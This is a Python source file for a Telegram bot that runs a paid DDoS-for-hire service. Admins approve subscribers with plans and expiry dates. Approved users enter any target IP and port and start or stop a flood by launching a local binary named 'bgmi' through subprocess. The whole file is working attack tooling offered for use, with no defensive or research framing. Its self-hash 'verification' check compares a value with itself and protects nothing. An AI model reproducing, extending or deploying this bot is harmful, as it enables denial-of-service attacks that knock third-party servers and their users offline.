import time
import logging
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Constants
CREATOR = "This File Is Made By @RAHUL_DDOS_B"
BotCode = hashlib.sha256(CREATOR.encode()).hexdigest()

# Verify integrity
def verify():
    if hashlib.sha256(CREATOR.encode()).hexdigest() != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")
    print("File verification successful.")

verify()

# Load configuration
try:
    with open('config.json') as config_file:
        config = json.load(config_file)
    BOT_TOKEN = config['bot_token']
    ADMIN_IDS = config['admin_ids']
except (FileNotFoundError, json.JSONDecodeError) as e:
    raise Exception("Error loading configuration file: " + str(e))

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"

# Blocked ports
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Utility functions for file operations
def load_json_file(file_path, default_value=None):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r') as file:
                return json.load(file)
        except json.JSONDecodeError:
            logging.error(f"Error reading JSON from {file_path}")
    return default_value or []

def save_json_file(file_path, data):
    with open(file_path, 'w') as file:
        json.dump(data, file, indent=4)

# User management
users = load_json_file(USERS_FILE)
user_attack_details = load_json_file(USER_ATTACK_FILE)

def save_users(users):
    save_json_file(USERS_FILE, users)

# Check user status
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    return any(user['user_id'] == user_id and user['plan'] > 0 for user in users)

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

# Attack management
active_attacks = {}

def run_attack_command_sync(target_ip, target_port, action):
    global active_attacks
    try:
        if action == 1:  # Start attack
            process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "25"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            active_attacks[(target_ip, target_port)] = process.pid
        elif action == 2:  # Stop attack
            pid = active_attacks.pop((target_ip, target_port), None)
            if pid:
                subprocess.run(["kill", str(pid)], check=True)
    except Exception as e:
        logging.error(f"Attack command failed: {e}")

# Telegram bot handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return
    bot.send_message(message.chat.id, f"Welcome, {message.from_user.username}!", reply_markup=create_main_markup())

def create_main_markup():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("Attack", "Start Attack 🚀", "Stop Attack")
    return markup

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    if not is_user_admin(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    approved_users = [user for user in users if user['plan'] > 0]
    if approved_users:
        response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
    else:
        response = "No approved users found."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    if not is_user_admin(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) < 2:
            raise ValueError("Invalid format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.")

        target_user_id = int(cmd_parts[1])

        if cmd_parts[0] == '/approve':
            plan, days = int(cmd_parts[2]), int(cmd_parts[3])
            valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
            for user in users:
                if user['user_id'] == target_user_id:
                    user['plan'] = plan
                    user['valid_until'] = valid_until
                    break
            else:
                users.append({"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0})
            save_users(users)
            bot.send_message(message.chat.id, f"User {target_user_id} approved with plan {plan} for {days} days.")
        elif cmd_parts[0] == '/disapprove':
            users[:] = [user for user in users if user['user_id'] != target_user_id]
            save_users(users)
            bot.send_message(message.chat.id, f"User {target_user_id} disapproved.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text in ["Attack", "Start Attack 🚀", "Stop Attack"])
def handle_attack_commands(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    if message.text == "Attack":
        msg = bot.send_message(chat_id, "Enter target IP and port (e.g., 192.168.1.1 8080):")
        bot.register_next_step_handler(msg, save_ip_port)
    elif message.text == "Start Attack 🚀":
        handle_start_attack(message)
    elif message.text == "Stop Attack":
        handle_stop_attack(message)

def save_ip_port(message):
    try:
        target_ip, target_port = message.text.split()
        user_attack_details[message.from_user.id] = (target_ip, int(target_port))
        save_json_file(USER_ATTACK_FILE, user_attack_details)
        bot.send_message(message.chat.id, f"Saved target: {target_ip}:{target_port}")
    except Exception:
        bot.send_message(message.chat.id, "Invalid format. Use: IP PORT")

def handle_start_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if not attack_details:
        bot.send_message(message.chat.id, "No target set. Use the 'Attack' button first.")
        return
    target_ip, target_port = attack_details
    if target_port in BLOCKED_PORTS:
        bot.send_message(message.chat.id, f"Port {target_port} is blocked.")
        return
    run_attack_command_sync(target_ip, target_port, action=1)
    bot.send_message(message.chat.id, f"Started attack on {target_ip}:{target_port}.")

def handle_stop_attack(message):
    attack_details = user_attack_details.get(message.from_user.id)
    if not attack_details:
        bot.send_message(message.chat.id, "No active attack to stop.")
        return
    target_ip, target_port = attack_details
    run_attack_command_sync(target_ip, target_port, action=2)
    bot.send_message(message.chat.id, f"Stopped attack on {target_ip}:{target_port}.")

# Run the bot
if __name__ == '__main__':
    try:
        bot.polling(none_stop=True)
    except KeyboardInterrupt:
        logging.info("Bot stopped.")